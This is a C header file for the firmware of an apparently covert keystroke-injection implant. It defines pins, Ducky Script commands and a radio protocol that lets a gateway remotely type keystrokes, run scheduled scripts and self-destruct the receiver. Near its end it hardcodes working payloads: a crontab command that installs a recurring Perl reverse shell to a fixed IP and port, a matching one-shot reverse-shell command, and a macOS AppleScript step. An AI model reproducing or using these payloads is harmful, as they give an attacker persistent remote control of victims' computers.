#ifndef LEK_PROTOCOL_DEFINITIONS_H
#define LEK_PROTOCOL_DEFINITIONS_H

/* Pins */
#define LEK_RFM_CS_PIN					16
#define LEK_RFM_INT_PIN					10
#define LEK_RFM_RESET_PIN				11
#define LEK_USB_DEVICE_MUX_PIN			22
#define LEK_USB_DEVICE_PWR_PIN			23
#define LEK_HB_LED_PIN					7
#define LEK_LINK_LED_PIN				6

#define LEK_RFM_FREQ 					915.0

#define LEK_MAX_PAYLOAD_SIZE 			RH_RF95_MAX_PAYLOAD_LEN
#define LEK_MINIMUM_MESSAGE_SIZE  		6
#define LEK_MAX_NODE_NAME         		20
#define LEK_INCOMING_PACKET_FIFO_SIZE	16
#define LEK_DEFAULT_TICK_RATE			1000
#define LEK_DEFAULT_COMMAND_DELAY_RATE 	500
#define DELAY_RATE  					LEK_DEFAULT_COMMAND_DELAY_RATE
#define LEK_DEFAULT_SERIAL_BAUD_RATE	9600
#define LEK_DEFAULT_SERIAL_TIMEOUT		1500
#define LEK_NUMBER_OF_EVENT_CALLBACKS	4
/* With the console buffer set at this length, we could stuff the maximum length of a line x2.
But, we could not stuff an entire script (4096), as that would be fairly ridiculous to pull off
in a single command anyway... */
#define LEK_MAX_CONSOLE_BUFFER			512
#define LEK_MAX_BEACONS_NEARBY			4

/* Ducky script root list! */

enum DuckyScriptCmdDefinition
{
    kDUCKY_REM,
    kDUCKY_DEFAULTDELAY,
    kDUCKY_DELAY,
    kDUCKY_STRING,
    kDUCKY_WINDOWS,
    kDUCKY_MENU,
    kDUCKY_SHIFT,
    kDUCKY_ALT,
    kDUCKY_CONTROL,
    kDUCKY_ENTER,
    kDUCKY_DOWN,
    kDUCKY_UP,
    kDUCKY_DUCKY_LEFT,
    kDUCKY_RIGHT,
    kDUCKY_BREAK,
    kDUCKY_CAPSLOCK,
    kDUCKY_DELETE,
    kDUCKY_END,
    kDUCKY_ESC,
    kDUCKY_HOME,
    kDUCKY_INSERT,
    kDUCKY_NUMLOCK,
    kDUCKY_PAGEUP,
    kDUCKY_PAGEDOWN,
    kDUCKY_PRINTSCREEN,
    kDUCKY_SCROLLLOCK,
    kDUCKY_SPACE,
    kDUCKY_TAB,
    kDUCKY_REPLAY
};

enum ExtendedDuckyScriptCmdDefinition
{
    kDUCKY_KEY,
    kDUCKY_DOUBLEKEYPRESS,
    kDUCKY_WAITFOREVENT,
    kDUCKY_WAIT,
    kDUCKY_MOUSE,
    kDUCKY_MOUSEJITTER,
    kDUCKY_USBMUX,
    kDUCKY_USBPOWERCONTROL,
    kDUCKY_REGISTEREVENT,
    kDUCKY_SENDPACKET
};


/* 
Console command definitions 
send - send a specific packet defined
scan - display all beacons received
beacon - set beaconing rate, 0 is "off"
pair - initiate a pairing sequence
receive - wait for a packet and display it
clear - clear all buffers
set - set parameter value
get - get parameter value
radio - start/stop the radio
sleep - allow the system to sleep for a uint32_t value of milliseconds
pin - write/read to an I/O location
pinmode - set the mode of an I/O location
save - write all set parameters in RAM to EEPROM/Flash
write - write to an address in EEPROM/Flash
read - read an address in EEPROM/Flash
help - display this list
reset - soft-reset system
version - spit out the firmware version
interactive - enter interactive typing mode with a particular node
*/

#define kCONSOLE_SEND 			"send"
#define kCONSOLE_SCAN 			"scan"
#define kCONSOLE_BEACON 		"beacon"
#define kCONSOLE_PAIR 			"pair"
#define kCONSOLE_RECEIVE 		"receive"
#define kCONSOLE_CLEAR			"clear"
#define kCONSOLE_SET			"set"
#define kCONSOLE_GET			"get"
#define kCONSOLE_RADIO			"radio"
#define kCONSOLE_SLEEP			"sleep"
#define kCONSOLE_PIN			"pin"
#define kCONSOLE_PINMODE		"pinmode"
#define kCONSOLE_SAVE			"save"
#define KCONSOLE_HELP			"help"
#define kCONSOLE_RESET			"reset"
#define kCONSOLE_VERSION		"version"
#define kCONSOLE_INTERACTIVE	"interactive"

/*
  Scripts
  Scripts are an absolute maximum of 4096 long.
  The first 64 bytes of the script is the script's map.
  Scripts can have a maximum of 32 lines, with the imposing maximum limit on size limiting
  the absolute line/index count.
  Script lines can be a maximum of 255 bytes long
  Each index points to an offset within the storage.
  Scripts are rebuilt into RAM upon device reset.
  When permanent script commits happen, the scripts are rebuilt into RAM.
  When a script map is read, a ScriptMap structure is created. This contains
  the information that is neccecary to rebuild the structure of the script in RAM.
  The first byte in a line is the control code which refers to the command itself. The rest of the line
  is any accompanying data with that control command. It is possible to have a line that is one byte long 
  (just the control code). 
*/

#define LEK_MAX_SCRIPT_SIZE		  		4096
#define LEK_MAX_LINE_SIZE				256
#define LEK_MAX_SCRIPT_LINES			32
#define LEK_SCRIPT_MAP_SIZE				64
#define LEK_SCRIPT_STORAGE_SLOTS		5

/* Parameters */
//Mode
//Network Address
//Events
//Node Name
//UUID
//Beacon Rate

/* 
  EEPROM Map
  EEPROM.length() will access the length for the current platform. The SAMD21E used on the LEAK
  matches the SAMD21G in size, so these values should be the same. No core change.
*/

#define LEK_EEPROM_MODE_OFFSET				0
#define LEK_EEPROM_NETWORK_ADDRESS_OFFSET 	1
//4 Events Positions 7-10
#define LEK_EEPROM_EVENTS_OFFSET 			7
//1 Node Name Maxmimum Length LEK_MAX_NODE_NAME (20) Positions 20-40
#define LEK_EEPROM_NODE_NAME_OFFSET			20
#define LEK_EEPROM_UUID_OFFSET 				42

#define LEK_EEPROM_PERM_SCRIPT_SLOT_ONE_OFFSET 		256
#define LEK_EEPROM_PERM_SCRIPT_SLOT_TWO_OFFSET 		LEK_EEPROM_PERM_SCRIPT_SLOT_ONE_OFFSET+(LEK_MAX_SCRIPT_SIZE*1)
#define LEK_EEPROM_PERM_SCRIPT_SLOT_THREE_OFFSET 	LEK_EEPROM_PERM_SCRIPT_SLOT_ONE_OFFSET+(LEK_MAX_SCRIPT_SIZE*2)
#define LEK_EEPROM_PERM_SCRIPT_SLOT_FOUR_OFFSET 	LEK_EEPROM_PERM_SCRIPT_SLOT_ONE_OFFSET+(LEK_MAX_SCRIPT_SIZE*3)
#define LEK_EEPROM_PERM_SCRIPT_SLOT_FIVE_OFFSET 	LEK_EEPROM_PERM_SCRIPT_SLOT_ONE_OFFSET+(LEK_MAX_SCRIPT_SIZE*4)

#define FAILURE -1
#define SUCCESS 0

#define LEK_MESSAGE_TYPE_INDEX     0
#define LEK_MESSAGE_SEQUENCE_INDEX 1
#define LEK_MESSAGE_SALT_INDEX     3
#define LEK_MESSAGE_PAYLOAD_START  6

/* 
 * Scripts and lines use the same storage plates, so you can create a script by stuffing multiple lines, or explicitly 
 * transmit a script. 
 */
#define LEK_RESERVED_BYTE               0x01 // SOH
#define LEK_RESERVED_MESSAGE_TERMINATOR 0xAA // ™
#define LEK_RESERVED_CMD_MODE_SENTINEL	0x23 // #

#define LEK_STORAGE_LOCATION_NON_VOLATILE 0x04
#define LEK_STORAGE_LOCATION_VOLATILE     0x02

#define LEK_SCHEDULE_IMMEDIATE    0x02
#define LEK_SCHEDULE_AT_TIME      0x03
#define LEK_SCHEDULE_AFTER_TICKS  0x04

#define LEK_SCRIPT_STOP   0x09
#define LEK_SCRIPT_START  0x07

// b denotes bytes.
// u denotes unsigned.
// s denotes signed.

// All nodes track the following attributes
// Node Name (string)
// Network Address (short)
// Beaconing (bool)
// Time (long)
// Uptime Ticks (long)
// Random "Process" Id (int)
// Power cycles (int)

//Base ID in load line and load script commands is a reserved byte currently.\
//No message payloads have zero length, all "empty" messages are padded with an 0x01 byte.

// [1b] Message Type [encryption start] [1b] Message Sequence [4b] Message Salt [nb] Data Payload [encryption end]
// A non-zero message sequence indicates a multiple packet transmission...

/*
*
*  Messages from the Receiver to the Gateway
*
*/

/* Send Beacon out from the Receiver - Note Beacons always have a zero sequence in the header.*/
// Unencrypted - Format: [1b] Node Name Length [n-20b] Node Name [1b] Network Address [4b] Uptime Ticks [1b] Software Version
#define LEK_RECEIVER_BEACON             0x02

/* Status Request response to the Gateway */
// Encrypted - Format: [1b] Node Name Length [n-20b] Node Name [1b] Network Address [1b] Beaconing [4b] RTC Time [4b] Uptime Ticks
#define LEK_GATEWAY_STATUS_RESPONSE         0x03

/* ACK is sent when a message is command is acknowledged by the receiver */
// Encrypted - Format: [1b] Source Message Sequence
#define LEK_GATEWAY_ACK               0x04

/* NACK is sent when a message is command is not acknowledged by the receiver */
// Encrypted - Format: [1b] Source Message Sequence [1b] Error/Reason
#define LEK_GATEWAY_NACK              0x05

/* Script Pack Conclude is sent when the receiver has successfully packed the entire script */
// Encrypted - Format: [1b] Source Message Sequence
#define LEK_GATEWAY_SCRIPT_PACK_CONCLUDE      0x06

/* The receiver responds with it's schedule when it is requested */
// Encrypted - Format: [1b] Actions Loaded [1b] Script Index [4b] RTC Time
#define LEK_GATEWAY_SCHEDULE_RESPONSE       0x08

/* The receiver responds with it's event poll configuration when it is requested */
// Encrypted - Format: [1b] Event Poll Slot 1 [1b] Event Poll Slot 2 [1b] Event Poll Slot 3 [1b] Event Poll Slot 4
#define LEK_GATEWAY_EVENT_POLL_CONFIGURATION_RESPONSE   0x0A

/* The receiver responds when it's completed the requested driveby */
// Encrypted - Format: [1b] 0x01 (Reserved)
#define LEK_GATEWAY_REVSHELL_COMPLETE    0x0B

/*
*
* Messages from the Gateway to the Receiver
*
*/

/* Send Beacon out from the Gateway */
// Unencrypted - Format: [1ub] Node Name Length [n-20ub] Node Name [1ub] Network Address [4ub] Uptime Ticks [1b] Software Version
// Responds with ACK/NACK
#define LEK_GATEWAY_BEACON              			 0x11

//Command Receiver to Key Press
// Encrypted - Format: [1ub] ASCII Keycode To Press
// Responds with ACK/NACK
#define LEK_RECEIVER_KEY_PRESS            		 	 0x12

//Command Receiver to Modifier Press
// Encrypted - Format: [1ub] Modifier [1ub] ASCII Keycode To Press 
// Responds with ACK/NACK
#define LEK_RECEIVER_MODIFIER_PRESS         		 0x13

//Command Receiver to type a line
// Encrypted - Format: [1b] (BOOLEAN) Terminate with CR/LF [1ub] Payload Size [nb] Payload
#define LEK_RECEIVER_LINE_PRESS            			 0x14

//Command Receiver to send the mouse to a location relative to current position
//Encrypted - Format: [2sb] X Positions To Move [2sb] Y Positions To Move [2sb] Scroll Wheel Positions To Move
#define LEK_RECEIVER_MOUSE_MOVE           			 0x15

//Command Receiver to set it's internal RTC
// Encrypted - Format: [4b] Epoch Time To Set
// Responds with ACK/NACK
#define LEK_RECEIVER_SET_TIME           			 0x16

//Command Receiver to pack a line
// Encrypted - Format: [1b] Base ID [1b] Storage Index [1b] Script Index [1b] Mode [1b] Payload Size [nb] Payload
#define LEK_RECEIVER_PACK_LINE          			 0x17

//Command Receiver to pack a script
// Encrypted - Format: [1b] Base ID [1b] Storage Index [1b] Storage Location [1b] Script Index [1b] Mode [1b] Payload Size [nb] Payload
#define LEK_RECEIVER_PACK_SCRIPT          			 0x18

//Command Receiver to schedule a packed script
// Encrypted - Format: [1b] Base ID [1b] Storage Index [1b] Storage Location [1b] Immediate/Scheduled/After Ticks [4b] Epoch Time To Execute/Execute After Ticks
// Responds with ACK/NACK
#define LEK_RECEIVER_SCHEDULE_SCRIPT        		 0x19

//Command Receiver to request a status packet from the receiver addressed
// Encrypted - Format: [1b] 0x01 (Reserved)
// Responds with Status Response (if available)
#define LEK_RECEIVER_STATUS_REQUEST         		 0x1A

//Command Receiver to setup an event trigger
// Encrypted - Format: [1b] Storage Index [1b] Event Trigger [1b] Activate Immediately/Activate After Ticks/Activate At Time [4b] Epoch Time To Activate 
// Responds with ACK/NACK
#define LEK_RECEIVER_SET_EVENT_TRIGGER        		 0x1B

//Command Receiver to clear all loaded scripts, lines and time
// Encrypted - Format: [1b] 0x01 (Reserved)
// Responds with ACK/NACK
#define LEK_RECEIVER_CLEAR_LOADS          			 0x1C

//Command Receiver to reboot (but not destroy)
// Encrypted - Format: [1b] 0x01 (Reserved)
// Responds with ACK/NACK
#define LEK_RECEIVER_RESET              			 0x1D

//Command receiver to reboot and destroy
// Encrypted - Format: [1b] 0x01 (Reserved)
// Responds with ACK/NACK
#define LEK_RECEIVER_SCUTTLE            			 0x1E

//Command Receiver to send it's schedule
// Encrypted - Format: [1b] 0x01 (Reserved)
// Responds with Schedule
#define LEK_RECEIVER_SCHEDULE_REQUEST       		 0x1F

//Command Receiver to send to execute a static interally baked routine
// Encrypted - Format: [1b] Routine Index To Execute
// Responds with ACK/NACK
#define LEK_RECEIVER_EXECUTE_BAKED_ROUTINE			 0x20

/* Requests an ACK from the gateway, this operation is a nop */
// Encrypted - Format: [1b] Reserved
#define LEK_RECEIVER_NOP							 0x21

//Command receiver to do something to the USB MUX
// Encrypted - Format: [1ub] MUX Device
#define LEK_RECEIVER_USB_MUX_CTL         0x30
enum UsbMuxState
{
    kMUX_MASTER = 1,
    kMUX_SLAVE =  2 
};

//Command receiver to do something with the slave's USB power
// Encrypted - Format: [1ub] Action
#define LEK_RECEIVER_USB_SLAVE_POWER_CTL     0x31
enum UsbPowerState 
{
	kUSB_POWER_OFF = 	1,
	kUSB_POWER_RESET = 	2,
	kUSB_POWER_ON  =  	3
};

#define SHELLBACK_CRONJOB "(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -"
#define APPLESCRIPT_MOVE_SYSTEM_PREFERENCES "osascript -e 'tell application \"System Events\" to set bounds of window \"System Preferences\" of application \"System Preferences\" to {0, 0, 700, 700}'"
#define SHELLBACK_TERMINAL_COMMAND "perl -MIO::Socket -e'$c=new IO::Socket::INET(\"72.14.179.47:1337\")'"

#define BAD_SERVER_IP "66.228.55.205"

#endif /* LEK_PROTOCOL_DEFINITIONS_H */
